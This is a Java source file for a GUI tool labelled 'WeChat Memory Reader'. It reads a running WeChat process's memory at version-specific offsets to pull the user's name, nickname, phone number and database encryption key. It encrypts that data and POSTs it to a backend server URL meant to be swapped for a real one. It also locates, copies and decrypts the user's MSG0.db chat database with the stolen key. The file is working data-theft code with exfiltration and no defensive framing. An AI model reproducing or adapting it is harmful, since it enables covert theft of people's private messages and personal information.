package org.Memory;

import com.formdev.flatlaf.FlatDarkLaf;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import utils.CryptoUtils;
import utils.HttpClientUtil;
import utils.JnaUtils;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import utils.Decryptor;

public class MainApp extends JFrame {

    private final JTextArea textArea;

    // 定义版本类
    static class Version {
        String versionName;
        long offsetUsername;
        long offsetNickname;
        long offsetPhoneNumber;
        long offsetKey;

        public Version(String versionName, long offsetUsername, long offsetNickname, long offsetPhoneNumber, long offsetKey) {
            this.versionName = versionName;
            this.offsetUsername = offsetUsername;
            this.offsetNickname = offsetNickname;
            this.offsetPhoneNumber = offsetPhoneNumber;
            this.offsetKey = offsetKey;
        }
    }

    // 定义版本列表
    private final List<Version> versions = List.of(
            new Version("java3.9.12.31", 0x5A23BE0L, 0x5A236A8L, 0x5A235E8L, 0x5A23BA0L),
            new Version("java3.9.13.0", 0x6B34CE1L, 0x6B34CA8L, 0x6B34C58L, 0x6B34CB0L),
            new Version("java3.9.14.1", 0x7C45DF2L, 0x7C45D58L, 0x7C45D18L, 0x7C45D60L)
            // 可以继续添加更多版本
    );

    // 后端服务器URL（请替换为实际URL）
    private static final String BACKEND_URL = "http://127.0.0.1:1337/receive";

    public MainApp(String title) {
        super(title);

        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(800, 600);
        setLocationRelativeTo(null);

        textArea = new JTextArea();
        textArea.setEditable(false);
        textArea.setLineWrap(true);
        textArea.setFont(new Font("Microsoft YaHei", Font.PLAIN, 14));

        JScrollPane scrollPane = new JScrollPane(textArea);
        add(scrollPane, BorderLayout.CENTER);
    }

    // 读取微信内存数据
    private void readWeChatMemory() {
        appendText("开始尝试读取 WeChat.exe 内存数据...\n");

        int pid = JnaUtils.getProcessIdByName("WeChat.exe");
        if (pid == -1) {
            appendText("'WeChat.exe' 未找到。\n");
            return;
        }
        appendText("找到 WeChat.exe，进程 ID = " + pid + "\n");

        boolean success = false;
        Version usedVersion = null;
        String username = null;
        String nickname = null;
        String phoneNumber = null;
        String key = null;

        for (Version version : versions) {
            appendText("\n尝试使用版本: " + version.versionName + "\n");

            Pointer moduleBase = JnaUtils.getModuleBaseAddress(pid, "WeChatWin.dll");
            if (moduleBase == null || moduleBase.equals(Pointer.NULL)) {
                appendText("模块 'WeChatWin.dll' 未找到。\n");
                continue;
            }
            long baseAddress = Pointer.nativeValue(moduleBase);
            appendText(String.format("模块 'WeChatWin.dll' 基址 = 0x%x\n", baseAddress));

            long offsetUsername = version.offsetUsername;
            long offsetNickname = version.offsetNickname;
            long offsetPhoneNumber = version.offsetPhoneNumber;
            long offsetKey = version.offsetKey;

            appendText("尝试读取各字段数据...\n");

            username = readString(pid, baseAddress + offsetUsername);
            nickname = readString(pid, baseAddress + offsetNickname);
            phoneNumber = readString(pid, baseAddress + offsetPhoneNumber);
            key = readKey(pid, baseAddress + offsetKey);

            if (!username.contains("读取失败") && !nickname.contains("读取失败") &&
                    !phoneNumber.contains("读取失败") && !key.contains("读取失败")) {
                appendText("\n成功读取数据，使用版本: " + version.versionName + "\n");
                usedVersion = version;
                success = true;
                break;
            } else {
                appendText("读取失败，尝试下一个版本。\n");
            }
        }

        if (!success) {
            appendText("\n所有版本均尝试失败，无法读取数据。\n");
            return;
        }

        appendText("\n[1] Username (WeChatWin.dll + " + usedVersion.offsetUsername + ")\n    " + username + "\n");
        appendText("\n[2] Nickname (WeChatWin.dll + " + usedVersion.offsetNickname + ")\n    " + nickname + "\n");
        appendText("\n[3] Phone number (WeChatWin.dll + " + usedVersion.offsetPhoneNumber + ")\n    " + phoneNumber + "\n");
        appendText("\n[4] Key (WeChatWin.dll + " + usedVersion.offsetKey + ")\n    " + key + "\n");

        appendText("\n--- 数据读取完毕 ---\n");

        // 加密并发送数据到后端
        try {
            sendDataToBackend(usedVersion.versionName, username, nickname, phoneNumber, key);
            appendText("数据已成功发送到后端服务器。\n");
        } catch (Exception e) {
            appendText("发送数据到后端时发生错误：\n" + e.getMessage() + "\n");
            e.printStackTrace();
        }
    }

    // 获取用户文档路径
    public String getPersonalPath() {
        try {
            String personalPath = Advapi32Util.registryGetStringValue(
                    WinReg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
                    "Personal"
            );

            if (personalPath != null) {
                return personalPath.replace("\"", "");
            } else {
                return null;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    // 搜索并处理MSG0.db
    private void search(String key) {
        appendText("\n尝试查找用户文件夹...\n");

        Path personalFolder = Paths.get(getPersonalPath());

        if (!Files.exists(personalFolder)) {
            appendText("未找到文档文件夹。\n");
            return;
        }

        appendText("文件夹已找到，正在搜索用户文件夹...\n");

        try {
            List<String> wxidFolders = new ArrayList<>();

            Files.walkFileTree(personalFolder, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    // 不需要对文件进行处理，继续
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
                    // 检查目录名是否以 wxid_ 开头
                    String folderName = dir.getFileName().toString();
                    if (folderName.startsWith("wxid_")) {
                        wxidFolders.add(folderName);
                        appendText("找到用户文件夹: " + folderName + "\n");
                        // 如果只需要找到第一个，就可以返回 TERMINATE
                        // return FileVisitResult.TERMINATE;
                    }
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path dir, IOException exc) throws IOException {
                    if (exc instanceof AccessDeniedException) {
                        appendText("遇到权限错误，跳过无法访问的文件夹: " + dir + "\n");
                    } else {
                        appendText("访问文件夹时遇到错误: " + dir + " - " + exc.getMessage() + "\n");
                    }
                    return FileVisitResult.CONTINUE; // 继续遍历
                }
            });

            if (wxidFolders.isEmpty()) {
                appendText("未找到任何用户文件夹\n");
                return;
            }

            appendText("找到以下用户文件夹：\n");
            for (int i = 0; i < wxidFolders.size(); i++) {
                appendText("[" + (i + 1) + "] " + wxidFolders.get(i) + "\n");
            }

            String selectedFolder = wxidFolders.get(0); // 默认选择第一个文件夹
            appendText("默认选择: " + selectedFolder + "\n");

            Path dbPath = Paths.get(personalFolder.toString(), "WeChat Files", selectedFolder, "Msg", "Multi", "MSG0.db");

            if (Files.exists(dbPath)) {
                appendText("找到文件 MSG0.db: " + dbPath + "\n");

                Path targetPath = Paths.get(System.getProperty("user.dir"), "MSG0.db");
                Files.copy(dbPath, targetPath, StandardCopyOption.REPLACE_EXISTING);
                appendText("已将 MSG0.db 复制到当前程序运行目录: " + targetPath + "\n");

                try {
                    Decryptor.操死数据库(key, targetPath.toString());
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            } else {
                appendText("未找到文件 MSG0.db。\n");
            }

        } catch (IOException e) {
            appendText("发生了其他错误：\n");
            e.printStackTrace();
        }
    }

    // 读取字符串
    private String readString(int pid, long address) {
        byte[] data = JnaUtils.readMemory(pid, address, 256);
        if (data == null) {
            return "[读取失败: 权限不足或地址无效]";
        }

        return filterString(new String(data, StandardCharsets.UTF_8).strip());
    }

    // 读取密钥
    private String readKey(int pid, long address) {
        byte[] array = JnaUtils.readMemory(pid, address, 8);
        if (array == null) {
            appendText("[读取失败: 权限不足或地址无效]\n");
            return "[读取失败]";
        }

        long lpBaseAddress2 = ((long) (array[7] & 0xFF) << 56) +
                ((long) (array[6] & 0xFF) << 48) +
                ((long) (array[5] & 0xFF) << 40) +
                ((long) (array[4] & 0xFF) << 32) +
                ((long) (array[3] & 0xFF) << 24) +
                ((long) (array[2] & 0xFF) << 16) +
                ((long) (array[1] & 0xFF) << 8) +
                ((long) (array[0] & 0xFF));

        byte[] array2 = JnaUtils.readMemory(pid, lpBaseAddress2, 32);
        if (array2 == null) {
            appendText("[读取失败: 权限不足或地址无效]\n");
            return "[读取失败]";
        }

        StringBuilder sb = new StringBuilder();
        for (byte b : array2) {
            sb.append(String.format("%02X", b));
        }
        return sb.toString().trim();
    }

    /**
     * 过滤字符串，只保留常见可见字符，去除明显乱码。
     * EzDiaoL补充一句。只要判断\0就可以知道末尾在哪
     */
    private String filterString(String input) {
        if (input == null) {
            return "[无效数据]";
        }

        StringBuilder sb = new StringBuilder();

        for (char c : input.toCharArray()) {
            if (c == '\0') {
                break;
            }

            sb.append(c);
        }

        return sb.isEmpty() ? "[无效数据]" : sb.toString();
    }

    // 追加文本到文本区域
    private void appendText(String text) {
        textArea.append(text);
        textArea.setCaretPosition(textArea.getDocument().getLength());
    }

    // 加密数据并发送到后端
    private void sendDataToBackend(String version, String username, String nickname, String phoneNumber, String key) throws Exception {
        // 构建JSON数据
        String jsonData = String.format("{\"version\":\"%s\",\"username\":\"%s\",\"nickname\":\"%s\",\"phoneNumber\":\"%s\",\"key\":\"%s\"}",
                version, username, nickname, phoneNumber, key);

        // 获取当前时间戳（UTC时间）
        String timestamp = HttpClientUtil.getCurrentTimestamp();

        // 生成动态密钥
        byte[] dynamicKey = CryptoUtils.generateDynamicKey("StaticSecretSeed", timestamp);

        // 加密数据
        String encryptedData = CryptoUtils.encrypt(jsonData, dynamicKey);

        // 发送HTTP POST请求
        HttpClientUtil.post(BACKEND_URL, encryptedData, timestamp);
    }

    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("无法设置 FlatDarkLaf 主题，使用默认外观。");
        }

        SwingUtilities.invokeLater(() -> {
            MainApp frame = new MainApp("WeChat Memory Reader - Combined Version");
            frame.setVisible(true);

            SwingUtilities.invokeLater(frame::readWeChatMemory);
        });
    }
}
